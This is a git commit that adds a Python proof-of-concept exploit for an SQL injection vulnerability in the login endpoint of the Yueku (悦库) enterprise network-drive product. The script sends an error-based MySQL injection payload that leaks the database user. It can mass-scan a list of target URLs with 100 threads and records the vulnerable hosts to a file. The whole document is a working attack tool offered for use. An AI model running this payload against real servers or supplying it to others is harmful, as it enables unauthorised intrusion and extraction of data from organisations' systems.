402d577daef33bea363851b29ec1f964ef23e79a
hardog123 <3331551889@qq.com>
2024-06-26 18:51:38 +0800

    Add files via upload

---
+++ POC/悦库企业网盘SQL注入漏洞/悦库企业网盘SQL注入漏洞.py
@@ -0,0 +1,75 @@
+import requests,sys,argparse,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+GREEN = '\033[92m'  # 输出颜色
+RESET = '\033[0m'
+
+def banner():
+    banner = """
+
+ ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
+▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
+▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
+░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
+░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
+ ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
+ ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
+                            ░                       
+                                       
+                            version:1.1.0
+                            author:Hardog  
+"""
+    print(banner)
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='悦库企业网盘 SQL注入漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
+    args = parser.parse_args()
+    #判断输入的参数是单个还是文件
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        #多线程
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    payload_url = "/user/login/.html"
+    url = target+payload_url
+    headers={
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding': 'gzip, deflate',
+        'X-Requested-With': 'XMLHttpRequest',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Priority': 'u=1'
+    }
+    data = "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK"    
+    try:
+        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
+        match = re.search(r'(\w+@\w+)', res.text)
+        if res.status_code == 200 and 'SQLSTATE[HY000]' in res.text :
+            print(f"{GREEN}[+]该url存在SQL注入漏洞{target}{RESET},\n用户名为:{match.group(1)}")
+            with open('result.txt','a',encoding='utf-8') as fp:
+                        fp.write(target+"\n")
+                        return True
+        else:
+            print(f"[-]该url不存在SQL注入漏洞")
+    except :
+        print(f"[*]该url存在问题")
+        return False
+
+if __name__ == '__main__':
+    main()
